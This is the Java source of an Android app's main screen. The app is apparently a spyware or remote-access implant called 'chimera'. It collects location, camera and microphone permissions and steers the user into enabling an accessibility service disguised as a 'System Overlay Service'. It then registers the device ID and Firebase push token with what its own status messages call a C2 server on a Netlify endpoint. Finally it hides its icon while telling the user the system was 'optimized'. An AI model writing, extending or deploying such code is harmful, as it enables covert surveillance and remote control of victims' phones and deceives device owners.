package com.chimera;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.messaging.FirebaseMessaging;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSIONS_REQUEST_CODE = 101;
    private static final String NETLIFY_REGISTER_URL = "https://chimeradmin.netlify.app/.netlify/functions/register-device";

    private TextView tvCheckPermissions;
    private TextView tvCheckAccessibility;
    private TextView tvDeviceInfo;
    private Button btnFinalize;
    private RequestQueue requestQueue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); 

        requestQueue = Volley.newRequestQueue(this);
        tvCheckPermissions = findViewById(R.id.tvCheckPermissions);
        tvCheckAccessibility = findViewById(R.id.tvCheckAccessibility);
        tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
        btnFinalize = findViewById(R.id.btnFinalize);

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        tvDeviceInfo.setText("Device ID: " + deviceId);

        tvCheckPermissions.setOnClickListener(v -> requestAppPermissions());
        tvCheckAccessibility.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        btnFinalize.setOnClickListener(v -> beginActivationSequence());
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkSystemState();
    }

    private void checkSystemState() {
        boolean permsGranted = arePermissionsGranted();
        boolean accessibilityEnabled = isAccessibilityServiceEnabled();
        updateChecklistItem(tvCheckPermissions, "Core Permissions", permsGranted);
        updateChecklistItem(tvCheckAccessibility, "System Overlay Service", accessibilityEnabled);

        if (permsGranted && accessibilityEnabled) {
            btnFinalize.setEnabled(true);
            btnFinalize.setBackgroundColor(Color.parseColor("#0088CC"));
            btnFinalize.setTextColor(Color.WHITE);
        } else {
            btnFinalize.setEnabled(false);
            btnFinalize.setBackgroundColor(Color.parseColor("#444444"));
            btnFinalize.setTextColor(Color.parseColor("#888888"));
        }
    }

    private String[] getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(android.Manifest.permission.CAMERA);
        permissions.add(android.Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS);
        }
        return permissions.toArray(new String[0]);
    }

    private boolean arePermissionsGranted() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
        for (String permission : getRequiredPermissions()) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private boolean isAccessibilityServiceEnabled() {
        ComponentName expectedComp = new ComponentName(this, CoreService.class);
        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices == null) return false;
        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServices);
        while (colonSplitter.hasNext()) {
            ComponentName enabledComp = ComponentName.unflattenFromString(colonSplitter.next());
            if (expectedComp.equals(enabledComp)) return true;
        }
        return false;
    }

    private void updateChecklistItem(TextView textView, String text, boolean isChecked) {
        String prefix = isChecked ? "[✅] " : "[⏳] ";
        int color = isChecked ? Color.GREEN : Color.YELLOW;
        textView.setText(prefix + text);
        textView.setTextColor(color);
    }

    private void requestAppPermissions() {
        List<String> neededPermissions = new ArrayList<>();
        for (String permission : getRequiredPermissions()) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);
            }
        }
        if (!neededPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, neededPermissions.toArray(new String[0]), PERMISSIONS_REQUEST_CODE);
        }
    }

    private void beginActivationSequence() {
        btnFinalize.setEnabled(false);
        btnFinalize.setText("Activating...");
        tvDeviceInfo.append("\n\nStatus: Fetching C2 token...");
        getTokenAndRegister();
    }

    private void getTokenAndRegister() {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.w(TAG, "FCM token failed", task.getException());
                tvDeviceInfo.append("\nStatus: FAILED. Check network.");
                btnFinalize.setEnabled(true);
                btnFinalize.setText("Retry Activation");
                return;
            }
            String token = task.getResult();
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            registerDeviceWithNetlify(deviceId, token);
        });
    }

    private void registerDeviceWithNetlify(String deviceId, String token) {
        tvDeviceInfo.append("\nStatus: Registering with C2 server...");
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            tvDeviceInfo.append("\nStatus: FAILED. Internal error.");
            return;
        }
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, NETLIFY_REGISTER_URL, postData,
                response -> {
                    tvDeviceInfo.append("\nStatus: ✅ Registration Complete.");
                    goDark();
                },
                error -> {
                    tvDeviceInfo.append("\nStatus: ❌ FAILED. C2 server rejected connection.");
                    btnFinalize.setEnabled(true);
                    btnFinalize.setText("Retry Activation");
                }
        );
        requestQueue.add(request);
    }

    private void goDark() {
        btnFinalize.setText("Activation Complete");
        tvDeviceInfo.append("\n\nSystem Optimized. This utility can now be closed.");
        Intent intent = new Intent(this, CoreService.class);
        intent.setAction("com.chimera.action.TOGGLE_ICON");
        intent.putExtra("show", "false");
        startService(intent);
        new Handler(Looper.getMainLooper()).postDelayed(this::finish, 3000);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
